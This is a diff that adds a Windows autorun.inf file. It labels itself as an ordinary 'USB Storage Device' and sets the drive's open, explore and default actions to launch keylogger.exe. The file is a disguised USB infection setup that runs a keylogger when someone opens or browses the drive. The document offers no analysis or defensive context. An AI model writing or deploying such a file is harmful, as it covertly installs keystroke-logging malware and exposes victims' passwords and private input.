@@ -1,0 +1,9 @@
+[autorun]
+open=keylogger.exe
+icon=keylogger.exe
+label=USB Storage Device
+action=Open USB Storage
+shell\open\command=keylogger.exe
+shell\open\default=1
+shell\explore\command=keylogger.exe
+shell\explore\default=1 
